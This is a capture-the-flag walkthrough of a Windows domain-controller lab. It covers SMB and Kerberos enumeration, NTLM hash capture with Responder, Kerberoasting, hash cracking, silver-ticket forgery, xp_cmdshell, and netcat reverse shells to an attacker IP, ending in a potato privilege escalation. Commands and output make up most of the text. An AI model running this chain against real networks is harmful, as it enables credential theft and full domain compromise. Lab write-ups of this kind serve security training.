
```bash
sudo nmap -sC -sV -Pn  10.10.90.122 --open 
```

**Results**

```output
Starting Nmap 7.95SVN ( https://nmap.org ) at 2025-09-18 18:51 EDT
Nmap scan report for 10.10.90.122
Host is up (0.024s latency).
Not shown: 989 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-18 22:51:57Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-18T22:52:00+00:00
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2025-09-17T22:51:30
|_Not valid after:  2026-03-19T22:51:30
|_ssl-date: 2025-09-18T22:52:40+00:00; +5s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BREACHDC, NetBIOS user: <unknown>, NetBIOS MAC: 0a:01:80:c2:a4:f1 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-18T22:52:00
|_  start_date: N/A
|_clock-skew: mean: 4s, deviation: 0s, median: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.54 seconds
                                                    
```

## Quick interpretation / findings (what matters and why)

- **This target is an Active Directory Domain Controller (hostname: `BREACHDC`, domain `breach.vl`)** — LDAP on 389, Kerberos on 88, DNS on 53, SMB/RPC ports and the SMB server fingerprinting imply AD services. Treat it as a DC for subsequent steps.
    
- **Kerberos (88) present** — AD Kerberos is available; SPNs and service accounts are relevant for Kerberoasting / SPN enumeration (if authorized).
    
- **LDAP (389) open** — LDAP can often be used for enumeration of users/computers/groups (read-only LDAP queries may disclose usernames, computer names, group membership).
    
- **SMB (139/445) exposed; SMB signing required** — SMB is present and NTLM/SMB behavior is important; nmap shows message signing enabled _and required_, which affects some credential relay or NTLM-based techniques.
    
- **RDP (3389) open** — remote desktop available; useful for later access attempts if credentials are obtained. `rdp-ntlm-info` leaked useful domain and host metadata.
    
- **WinRM / HTTPAPI (5985)** — WinRM/PowerShell remoting may be reachable (useful for post-exploitation via valid creds).
    
- **Simple DNS Plus on 53** — DNS running; DNS data or zone transfers (if misconfigured) can reveal hosts.
    
- **Certificate info** — The TLS cert commonName is `BREACHDC.breach.vl`; cert valid dates look normal.
    
- **OS / Version** — Product_Version: `10.0.20348` (Windows Server build; useful for mapping known hardening guidance and patches).


**SMB**

Firstly, I found the domain which is `breach.vl` and the DC (Domain Controller) FQDN (Fully-Qualified Domain Name) which is `BREACHDC.breach.vl`.

Starting by enumerating SMB, I can get a null session and list the shares on the domain controller

```bash
 smbclient -L //BREACHDC.breach.vl
```

```output
assword for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to BREACHDC.breach.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I was able to enumerate users on the machine, by performing rid bruteforce using `nxc` and the guest account.

```bash
nxc smb BREACHDC.breach.vl -u guest -p '' --rid-brute
```

```output
MB         10.10.90.122    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False) 
SMB         10.10.90.122    445    BREACHDC         [+] breach.vl\guest: 
SMB         10.10.90.122    445    BREACHDC         498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         500: BREACH\Administrator (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         501: BREACH\Guest (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         502: BREACH\krbtgt (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         512: BREACH\Domain Admins (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         513: BREACH\Domain Users (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         514: BREACH\Domain Guests (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         515: BREACH\Domain Computers (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         516: BREACH\Domain Controllers (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         517: BREACH\Cert Publishers (SidTypeAlias)
SMB         10.10.90.122    445    BREACHDC         518: BREACH\Schema Admins (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         519: BREACH\Enterprise Admins (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         520: BREACH\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         521: BREACH\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         522: BREACH\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         525: BREACH\Protected Users (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         526: BREACH\Key Admins (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         527: BREACH\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         553: BREACH\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.90.122    445    BREACHDC         571: BREACH\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.90.122    445    BREACHDC         572: BREACH\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.90.122    445    BREACHDC         1000: BREACH\BREACHDC$ (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1101: BREACH\DnsAdmins (SidTypeAlias)
SMB         10.10.90.122    445    BREACHDC         1102: BREACH\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         1103: BREACH\SQLServer2005SQLBrowserUser$BREACHDC (SidTypeAlias)
SMB         10.10.90.122    445    BREACHDC         1104: BREACH\staff (SidTypeGroup)
SMB         10.10.90.122    445    BREACHDC         1105: BREACH\Claire.Pope (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1106: BREACH\Julia.Wong (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1107: BREACH\Hilary.Reed (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1108: BREACH\Diana.Pope (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1109: BREACH\Jasmine.Price (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1110: BREACH\George.Williams (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1111: BREACH\Lawrence.Kaur (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1112: BREACH\Jasmine.Slater (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1113: BREACH\Hugh.Watts (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1114: BREACH\Christine.Bruce (SidTypeUser)
SMB         10.10.90.122    445    BREACHDC         1115: BREACH\svc_mssql (SidTypeUser)


```

```bash
nxc smb BREACHDC.breach.vl -u guest -p '' --rid-brute | awk -F'\\\\' '/BREACH/{print $2}' | awk '{print $1}'>users.txt
```

Explanation:

- `-F'\\\\'` tells awk to use `\` as the field separator.
    
- `/BREACH/` ensures we only process lines that contain domain accounts.
    
- `print $2` prints the part after the slash (`Claire.Pope (SidTypeUser)`).
    
- The second `awk '{print $1}'` strips away the `(SidTypeUser)` part, leaving just `Claire.Pope`.

So the output will look like this:

```output
guest:
Enterprise
Administrator
Guest
krbtgt
Domain
Domain
Domain
Domain
Domain
Cert
Schema
Enterprise
Group
Read-only
Cloneable
Protected
Key
Enterprise
RAS
Allowed
Denied
BREACHDC$
DnsAdmins
DnsUpdateProxy
SQLServer2005SQLBrowserUser$BREACHDC
staff
Claire.Pope
Julia.Wong
Hilary.Reed
Diana.Pope
Jasmine.Price
George.Williams
Lawrence.Kaur
Jasmine.Slater
Hugh.Watts
Christine.Bruce
svc_mssql

```

```bash
./kerbrute userenum -d breach.vl --dc BREACHDC.breach.vl users.txt
```

```output
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Administrator@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Guest@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       BREACHDC$@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Claire.Pope@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Julia.Wong@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Hilary.Reed@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Diana.Pope@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       George.Williams@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Jasmine.Price@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Lawrence.Kaur@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Hugh.Watts@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Jasmine.Slater@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       Christine.Bruce@breach.vl
2025/09/18 19:28:32 >  [+] VALID USERNAME:       svc_mssql@breach.vl
2025/09/18 19:28:32 >  Done! Tested 38 usernames (14 valid) in 0.132 seconds
                                                       

```

This output gives you a clean list of accounts that exist in the domain, which can be used for auditing or further authorized enumeration like Kerberoasting or password testing in your lab environment.

```bash
sed -i 's/\r$//' ntlm_theft.py
chmod +x ntlm_theft.py
```

```bash
./ntlm_theft.py -g all -s 10.8.7.96 -f Paycheck

```

or i can use

```bash
python3 SMB_Killer.py -l 10.8.7.96 -i tun0 -r 10.10.90.122 -a share -A -o transfer

```


```bash

smbclient //BREACHDC.breach.vl/share -W breach.vl -U guest%

```

Try anonymous (`guest`) access to the `share` on `BREACHDC.breach.vl`.  
Expect/Next:

```output
smb: \> ls
  .                                   D        0  Thu Feb 17 09:11:08 2022
  ..                                DHS        0  Thu Feb 17 10:38:00 2022
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Fri Sep 19 19:03:32 2025

                7863807 blocks of size 4096. 2616199 blocks available
smb: \> cd transfer
smb: \transfer\> recurse on
smb: \transfer\> prompt off
smb: \transfer\> mput *

```

List files, enter the `transfer` folder, enable recursive upload, disable prompts, and upload all local files to the remote directory.

```bash
sudo responder -I tun0 -d -F -P -v
```

Run Responder on `tun0` to capture and poison LLMNR/NBT-NS/MDNS requests, with fingerprinting, WPAD capture, and verbose output enabled.

```output
SMB] NTLMv2-SSP Client   : 10.10.88.85
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:b523438767f45d5f:D82C2FCA2E019EF63ED6D5317D5D0CC4:010100000000000000FC31F89A29DC01A251D247FD65149200000000020008004F0030005A00500001001E00570049004E002D0042005800360044004C004D004C004E0038004600430004003400570049004E002D0042005800360044004C004D004C004E003800460043002E004F0030005A0050002E004C004F00430041004C00030014004F0030005A0050002E004C004F00430041004C00050014004F0030005A0050002E004C004F00430041004C000700080000FC31F89A29DC01060004000200000008003000300000000000000001000000002000007A081E260252911FA880E2DB9CA4FBB8EB993FC53104BE801361A417E4032A240A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0037002E00390036000000000000000000                                       
```

so i download hashcat on my local computer and create a hash file hash.txt

```bash
@"
Julia.Wong::BREACH:b523438767f45d5f:D82C2FCA2E019EF63ED6D5317D5D0CC4:010100000000000000FC31F89A29DC01A251D247FD65149200000000020008004F0030005A00500001001E00570049004E002D0042005800360044004C004D004C004E0038004600430004003400570049004E002D0042005800360044004C004D004C004E003800460043002E004F0030005A0050002E004C004F00430041004C00030014004F0030005A0050002E004C004F00430041004C00050014004F0030005A0050002E004C004F00430041004C000700080000FC31F89A29DC01060004000200000008003000300000000000000001000000002000007A081E260252911FA880E2DB9CA4FBB8EB993FC53104BE801361A417E4032A240A0010000000000000000000000000000000000009001C0063006900660073002F00310030002E0038002E0037002E00390036000000000000000000
"@ | Out-File -FilePath "hash.txt" -Encoding ASCII

```

**Purpose:**

- Use Hashcat to attempt cracking **NTLMv2 hashes** (`-m 5600`) stored in `hash.txt`.
    
- The `rockyou.txt` wordlist provides candidate passwords.
```bash
.\hashcat.exe -m 5600 hash.txt rockyou.txt
```

You ran Hashcat on the NTLMv2 hash from `Julia.Wong` using the command `.\hashcat.exe -m 5600 hash.txt rockyou.txt` and successfully recovered the password `computer 1` within seconds. The tool tested passwords from the `rockyou.txt` wordlist at ~565 kH/s, cracking 1 of 1 hashes. This confirms the hash can be tested offline in a controlled lab environment.


```output


04c004e003800460043002e004f0030005a0050002e004c004f00430041004c00030014004f0030005a0050002e004c004f00430041004c00050014004f0030005a0050002e004c004f00430041004c000700080000fc31f89a29dc01060004000200000008003000300000000000000001000000002000007a081e260252911fa880e2db9ca4fbb8eb993fc53104be801361a417e4032a240a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0038002e0037002e00390036000000000000000000:Computer1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: JULIA.WONG::BREACH:b523438767f45d5f:d82c2fca2e019ef...000000
Time.Started.....: Sat Sep 20 01:38:37 2025 (0 secs)
Time.Estimated...: Sat Sep 20 01:38:37 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   565.3 kH/s (10.06ms) @ Accel:16 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 122880/14344384 (0.86%)
Rejected.........: 0/122880 (0.00%)
Restore.Point....: 98304/14344384 (0.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Detroit -> money89

Started: Sat Sep 20 01:38:18 2025
Stopped: Sat Sep 20 01:38:38 2025
```

Remember that port 1433 was present and we know there is a user called `svc_mssql`.
I tried to look for kerberoastable users, and we could perform kerberoast for `svc_mssql`.

```bash
 impacket-GetUserSPNs -request breach.vl/julia.wong:Computer1 -dc-ip 10.10.88.85
```

```output

ervicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 05:43:08.106169  2025-09-19 18:52:27.234976             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$7ab5397595382261df04660e8f8a9754$cfd3e177fc047cc6fbe6d3889acb3f2329148618ba390dc4633382c27767937eec3ec6c4b85107e057235065f3602fe3c1c3e873ca1b7adbb130219366f3c31b91a527dd74efee124a2cc1329428656432b54d74893efcef4f4838a91bbd41290fc53318f13a0f7e078f538bee92cbb676f87e4c19c7a6003d69c3aebbd699f3de532d167e9e68d97667e257faaa8af268cc5ed6385cc1ad9bbd9900237d43116700c95c46ed08df31e2a566661eaea9fc455a7c9b0b88639b9b0d7f19e55c951d5fdfbffd61df5d3b6c9fb40d123507463ed7b1ca3a9f459a3b0cf0cd99323d5354bbd69f2110c6785b85d0064f391d9218090820e77ceba40258300d39d0ca2ee5122e7fb32d4598a162e114d60a1c3069171c9a13d7234ca28f6d9ac3ff7e17985c2b3a8f6d1ca134f07b2917992f20c77dd20db8af80607621790f2426b85029f6d32362bf2fae56cfc8412bb8a7a2e283844a37d3dc7250f3719f4d2fbb1e16e39ed126ea8772ed550c068233afb6458e4b43a178f4d825ec78991732580a8f2c7bb284a9b88595c6764dd9683b3c6957d9b9750bbf62a4d3e90fe0a4cbf814df5ec279d63b35d0dfc3c5dbcb2e84b05dff6051ec6a9ef8e1f8dfdd89ffc34560c5d6283312d930a4f9d1fccb7e28fae9a8a89f7a0e2aa9badbda4cc710d614949e1d00de8d3ad9a24558ff221bb5e9a23ec20e59ca4d766c456de165e3ad372d0875b3acbedd4c575ed13df728bb96246e2cf7cc63c32df8dbddfb2b6b2428bc99b30fcb56fc59e602a66016678776752115c1862d0867a4d9aaf0ff5932852b462a2a16e464a0d858a94e77e54818abf288222491fb07ef08cc4e8f2be062b785dc528974021413b68d85d6533ee56ef921e7583378476770abbcd771d6f4322035b7245c8d132fc618e57cab3f5b1de42a300ed775b800be20495c4e175c9feda5cd27e4ce820905cdf12f1c9e70ab4ff2ba561a545347202be225a0e4f6ab9696f02ae58dc7b08c70b37db27b2af7ee9b50c5501fbfa86db07ca47bb66e7f44c1e26d306fda2b1099bff69c7517d7cb1c1cdf29309ec87671563cda67b039ad6912d57c38ec948d9b0739fb15e7cd29a3fd4625e68460f092a648d69a17c05b0f4e8f6a80aa915f348d6779387dee63c29a9e049205f531ee0de9243329be2e973c6fc75e32aa8980e51e577ed7884ec2469dd711b8b8de6a1a1f9c82b628b34a07bf90c8ea401ed800780b0f82238e55c29e234ef56372a5c329b1ee693ccca637ec86e32a9d574d75c925fcac59dea28743c80daa742dfc52eb06cea2dbc0089b61fc476f7cd345399b0544f147a4a28022237450c790780a4226be3525c1b0eed79db1ad99fa61b961180a8bc2f9ff50f7ff480b87305e1f853d91884d26e3023165ff620739024fbda6d66fea306b9cf89cb7c836a72be70810614862e367df9ce7acdfcb56f5e839c20c063ac7
                                                                                                 
```


so i make a file hashes.txt
```bash
# Create a separate file for the Kerberos hash
$kerbHash = '$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$7ab5397595382261df04660e8f8a9754$cfd3e177fc047cc6fbe6d3889acb3f2329148618ba390dc4633382c27767937eec3ec6c4b85107e057235065f3602fe3c1c3e873ca1b7adbb130219366f3c31b91a527dd74efee124a2cc1329428656432b54d74893efcef4f4838a91bbd41290fc53318f13a0f7e078f538bee92cbb676f87e4c19c7a6003d69c3aebbd699f3de532d167e9e68d97667e257faaa8af268cc5ed6385cc1ad9bbd9900237d43116700c95c46ed08df31e2a566661eaea9fc455a7c9b0b88639b9b0d7f19e55c951d5fdfbffd61df5d3b6c9fb40d123507463ed7b1ca3a9f459a3b0cf0cd99323d5354bbd69f2110c6785b85d0064f391d9218090820e77ceba40258300d39d0ca2ee5122e7fb32d4598a162e114d60a1c3069171c9a13d7234ca28f6d9ac3ff7e17985c2b3a8f6d1ca134f07b2917992f20c77dd20db8af80607621790f2426b85029f6d32362bf2fae56cfc8412bb8a7a2e283844a37d3dc7250f3719f4d2fbb1e16e39ed126ea8772ed550c068233afb6458e4b43a178f4d825ec78991732580a8f2c7bb284a9b88595c6764dd9683b3c6957d9b9750bbf62a4d3e90fe0a4cbf814df5ec279d63b35d0dfc3c5dbcb2e84b05dff6051ec6a9ef8e1f8dfdd89ffc34560c5d6283312d930a4f9d1fccb7e28fae9a8a89f7a0e2aa9badbda4cc710d614949e1d00de8d3ad9a24558ff221bb5e9a23ec20e59ca4d766c456de165e3ad372d0875b3acbedd4c575ed13df728bb96246e2cf7cc63c32df8dbddfb2b6b2428bc99b30fcb56fc59e602a66016678776752115c1862d0867a4d9aaf0ff5932852b462a2a16e464a0d858a94e77e54818abf288222491fb07ef08cc4e8f2be062b785dc528974021413b68d85d6533ee56ef921e7583378476770abbcd771d6f4322035b7245c8d132fc618e57cab3f5b1de42a300ed775b800be20495c4e175c9feda5cd27e4ce820905cdf12f1c9e70ab4ff2ba561a545347202be225a0e4f6ab9696f02ae58dc7b08c70b37db27b2af7ee9b50c5501fbfa86db07ca47bb66e7f44c1e26d306fda2b1099bff69c7517d7cb1c1cdf29309ec87671563cda67b039ad6912d57c38ec948d9b0739fb15e7cd29a3fd4625e68460f092a648d69a17c05b0f4e8f6a80aa915f348d6779387dee63c29a9e049205f531ee0de9243329be2e973c6fc75e32aa8980e51e577ed7884ec2469dd711b8b8de6a1a1f9c82b628b34a07bf90c8ea401ed800780b0f82238e55c29e234ef56372a5c329b1ee693ccca637ec86e32a9d574d75c925fcac59dea28743c80daa742dfc52eb06cea2dbc0089b61fc476f7cd345399b0544f147a4a28022237450c790780a4226be3525c1b0eed79db1ad99fa61b961180a8bc2f9ff50f7ff480b87305e1f853d91884d26e3023165ff620739024fbda6d66fea306b9cf89cb7c836a72be70810614862e367df9ce7acdfcb56f5e839c20c063ac7'
$kerbHash | Out-File -FilePath "kerberos_hash.txt" -Encoding ASCII

```


than i want to crack it by using 
```bash

 .\hashcat.exe -m 13100 -D 2 kerberos_hash.txt  rockyou.txt
```

```output
bff69c7517d7cb1c1cdf29309ec87671563cda67b039ad6912d57c38ec948d9b0739fb15e7cd29a3fd4625e68460f092a648d69a17c05b0f4e8f6a80aa915f348d6779387dee63c29a9e049205f531ee0de9243329be2e973c6fc75e32aa8980e51e577ed7884ec2469dd711b8b8de6a1a1f9c82b628b34a07bf90c8ea401ed800780b0f82238e55c29e234ef56372a5c329b1ee693ccca637ec86e32a9d574d75c925fcac59dea28743c80daa742dfc52eb06cea2dbc0089b61fc476f7cd345399b0544f147a4a28022237450c790780a4226be3525c1b0eed79db1ad99fa61b961180a8bc2f9ff50f7ff480b87305e1f853d91884d26e3023165ff620739024fbda6d66fea306b9cf89cb7c836a72be70810614862e367df9ce7acdfcb56f5e839c20c063ac7:Trustno1

Session..........: hashcat
Status...........: Cracked

```

so we cracked the password

Connect to the SQL Server using `svc_mssql`’s credentials:
```bash
 impacket-mssqlclient breach.vl/svc_mssql:Trustno1@BREACHDC.breach.vl -windows-auth

```

I didn’t find anything interesting inside the databases, and I cannot abuse `xp_cmdshell` at the moment. I own a service account, so using its password, I can create a silver ticket to impersonate the administrator user.

```bash
python3 lookupsid.py breach.vl/svc_mssql:Trustno1@BREACHDC.breach.vl

```

so i found domain sid

```bash
StringBinding ncacn_np:BREACHDC.breach.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856
498: BREACH\Enterprise Read-only Domain Controllers (SidTypeGroup)

```

so lets find NTHASH
```bash

python3 -c "from impacket.ntlm import compute_nthash;
print(compute_nthash('Trustno1').hex())"

```

```output
69596c7aa1e8daee17f8e78870e25a5c
```

Run `impacket-ticketer.py` with your NT hash:
```bash

impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid  S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 administrator
```

The output shows that `impacket-ticketer.py` successfully created a Kerberos ticket for `administrator@breach.vl`, embedding the PAC logon and client info, encrypting the ticket using the provided NT hash, and saving it as `administrator.ccache`. This ticket can now be verified with `klist` and used to authenticate to Kerberos-aware services like SMB or MSSQL without needing the plaintext password, effectively allowing access as the specified user.


```output
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache


```

ith the ticket saved as `administrator.ccache` and `KRB5CCNAME` set, you can connect to the MSSQL service using **Impacket’s `mssqlclient`**
```bash
export KRB5CCNAME=administrator.ccache
```

```bash
impacket-mssqlclient  administrator@BREACHDC.breach.vl -k -no-pass 

```

Perfect! This output confirms that your **Kerberos-authenticated connection to MSSQL** worked successfully.
```output

Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> 

```


so we wiill first enable it
```bash
enable_xp_cmdshell
```

first we will make temp dir
```bash
xp_cmdshell mkdir C:\Temp
```


then we will download nc64.exe
```bash
xp_cmdshell powershell -c "wget -usebasicparsing http://10.8.7.96:8001/nc64.exe -o C:\Temp\nc64.exe"
```

than we will execute it
```bash
EXEC xp_cmdshell 'C:\Temp\nc64.exe -e cmd.exe 10.8.7.96 4444';
```

we get a reverse shell
```bash

nc -nlvp 4444                                 
listening on [any] 4444 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.88.85] 58950
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.


```

next

```bash 
whoami/all
```

we see se impersonate priv is enable 
```output
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled



```

The user has the SeImpersonatePrivilege, which means that we can pull off a Potato attack to get code execution as system!

Essentially, in a potato attack, we make the SYSTEM account authenticate to an endpoint that we control. This allows us to capture his authentication token, and use it to impersonate the SYSTEM account.

```bash

Invoke-WebRequest -Uri "http://10.8.7.96:8000/god.exe" -OutFile "god.exe"

```

so we will execute now
```bash
.\god.exe -cmd "nc64.exe -e cmd.exe 10.8.7.96 80"
```

so we get reverse shell
```output
nc -nlvp 80                                   
listening on [any] 80 ...
connect to [10.8.7.96] from (UNKNOWN) [10.10.88.85] 55746
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\Temp>whoami 


```

we get the  flag
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
VL{069f8fe92a80b20151e0a5ffa1dc040c}
```
